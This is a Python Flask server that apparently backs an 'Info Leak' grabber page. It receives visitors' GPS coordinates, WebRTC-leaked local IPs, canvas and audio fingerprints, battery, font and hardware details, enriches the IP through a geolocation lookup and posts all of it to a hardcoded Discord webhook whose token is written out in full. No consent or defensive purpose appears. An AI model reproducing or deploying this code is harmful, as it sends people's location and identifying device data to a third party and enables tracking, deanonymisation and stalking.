from flask import Flask, request, jsonify, send_file
import json
import datetime
import requests

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"

@app.route('/')
def serve_index():
    return send_file('../static/index.html')

@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    print("Data received:", json.dumps(data, indent=2))
    
    # Get IP from request
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Try to get IP intelligence
    ip_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'ip': ip_data.get('query'),
                    'country': ip_data.get('country'),
                    'region': ip_data.get('regionName'),
                    'city': ip_data.get('city'),
                    'zip': ip_data.get('zip'),
                    'isp': ip_data.get('isp'),
                    'org': ip_data.get('org'),
                    'as': ip_data.get('as'),
                    'timezone': ip_data.get('timezone')
                }
    except Exception as e:
        print(f"IP lookup failed: {e}")
    
    data['ipInfo'] = ip_info
    data['clientIp'] = client_ip
    
    # Send to Discord with boxed formatting
    send_to_discord(data)
    
    return jsonify({"status": "success", "discord_sent": True})

def send_to_discord(data):
    """Send boxed format to Discord"""
    
    location = data.get('location', {})
    ip_info = data.get('ipInfo', {})
    screen = data.get('screen', {})
    battery = data.get('battery', {})
    webrtc = data.get('webRTCIPs', [])
    perf = data.get('performance', {})
    hw = data.get('hardware', {})
    fonts = data.get('fonts', [])
    plugins = data.get('plugins', [])
    
    # Build boxed message
    lines = []
    lines.append("```")
    lines.append("╔════════════════════════════════════════════════════════════╗")
    lines.append("║                    📡 INFO LEAK                           ║")
    lines.append("╠════════════════════════════════════════════════════════════╣")
    lines.append("")
    
    # LOCATION
    if location and location.get('latitude'):
        lat = location.get('latitude')
        lng = location.get('longitude')
        acc = location.get('accuracy', 'N/A')
        lines.append("║ 📍 GPS LOCATION")
        lines.append(f"║    {lat}, {lng}")
        lines.append(f"║    Accuracy: ±{acc}m")
        lines.append(f"║    https://maps.google.com/?q={lat},{lng}")
    else:
        lines.append(f"║ 📍 LOCATION: ❌ {location.get('error', 'Not shared')}")
    lines.append("║")
    
    # IP INTELLIGENCE
    if ip_info:
        lines.append("║ 🌐 IP INTELLIGENCE")
        if ip_info.get('ip'): lines.append(f"║    IP: {ip_info['ip']}")
        if ip_info.get('city') and ip_info.get('country'):
            lines.append(f"║    Location: {ip_info.get('city')}, {ip_info.get('country')}")
        if ip_info.get('isp'): lines.append(f"║    ISP: {ip_info['isp']}")
        if ip_info.get('org'): lines.append(f"║    Org: {ip_info['org']}")
        if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
        if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
    lines.append("║")
    
    # DEVICE & BROWSER
    lines.append("║ 🖥️ DEVICE & BROWSER")
    lines.append(f"║    OS: {data.get('platform', 'N/A')}")
    lines.append(f"║    Browser: {data.get('userAgent', 'N/A')[:60]}...")
    lines.append(f"║    Language: {data.get('language', 'N/A')}")
    if hw.get('hardwareConcurrency'):
        lines.append(f"║    CPU: {hw['hardwareConcurrency']} cores")
    if hw.get('deviceMemory'):
        lines.append(f"║    RAM: {hw['deviceMemory']}GB")
    if hw.get('maxTouchPoints'):
        lines.append(f"║    Touch Points: {hw['maxTouchPoints']}")
    lines.append("║")
    
    # SCREEN
    lines.append("║ 📺 SCREEN")
    lines.append(f"║    Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
    lines.append(f"║    Pixel Ratio: {screen.get('pixelRatio', 'N/A')}x")
    lines.append(f"║    Color Depth: {screen.get('colorDepth', 'N/A')}bit")
    lines.append("║")
    
    # WEBRTC LEAK
    if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
        lines.append("║ 🔓 WEBRTC LEAK")
        for ip in webrtc:
            lines.append(f"║    {ip}")
    lines.append("║")
    
    # FINGERPRINTS
    lines.append("║ 🆔 FINGERPRINTS")
    canvas = data.get('canvasFingerprint', 'N/A')
    audio = data.get('audioFingerprint', 'N/A')
    lines.append(f"║    Canvas: {canvas[:12]}")
    lines.append(f"║    Audio: {audio[:12]}")
    lines.append("║")
    
    # BATTERY
    if battery:
        lines.append("║ 🔋 BATTERY")
        if battery.get('level'): lines.append(f"║    Level: {battery['level']}")
        if battery.get('charging') is not None:
            status = "Charging" if battery['charging'] else "Discharging"
            lines.append(f"║    Status: {status}")
    lines.append("║")
    
    # PERFORMANCE
    if perf and perf.get('loadTime') and perf['loadTime'] != 'N/A':
        lines.append("║ ⚡ PERFORMANCE")
        if perf.get('loadTime'): lines.append(f"║    Load Time: {perf['loadTime']}ms")
        if perf.get('dns'): lines.append(f"║    DNS: {perf['dns']}ms")
        if perf.get('ttfb'): lines.append(f"║    TTFB: {perf['ttfb']}ms")
        if perf.get('tcp'): lines.append(f"║    TCP: {perf['tcp']}ms")
    lines.append("║")
    
    # TIMEZONE
    lines.append("║ 🕐 TIMEZONE")
    lines.append(f"║    {data.get('timezone', 'N/A')}")
    if data.get('timezoneOffset') is not None:
        offset = data['timezoneOffset']
        hours = abs(offset) // 60
        mins = abs(offset) % 60
        sign = '-' if offset > 0 else '+'
        lines.append(f"║    UTC{sign}{hours:02d}:{mins:02d}")
    lines.append("║")
    
    # FONTS
    if fonts:
        font_list = ', '.join(fonts[:8])
        if len(fonts) > 8:
            font_list += f" +{len(fonts)-8} more"
        lines.append("║ 📝 FONTS")
        lines.append(f"║    {font_list}")
    lines.append("║")
    
    # PLUGINS
    if plugins:
        plugin_list = ', '.join(plugins[:5])
        if len(plugins) > 5:
            plugin_list += f" +{len(plugins)-5} more"
        lines.append("║ 🧩 PLUGINS")
        lines.append(f"║    {plugin_list}")
    lines.append("║")
    
    # SESSION
    lines.append("║ 🆔 SESSION")
    lines.append(f"║    ID: {data.get('sessionId', 'N/A')}")
    if data.get('timestamp'):
        ts = data['timestamp'][:19].replace('T', ' ')
        lines.append(f"║    Time: {ts}")
    if data.get('referrer') and data['referrer'] != 'Direct':
        lines.append(f"║    Referrer: {data['referrer'][:50]}...")
    lines.append("║")
    
    # BOTTOM BORDER
    lines.append("╚════════════════════════════════════════════════════════════╝")
    lines.append("```")
    
    # Send to Discord
    payload = {
        "content": "\n".join(lines),
        "username": "Info Leak"
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        print(f"Discord status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

app = app
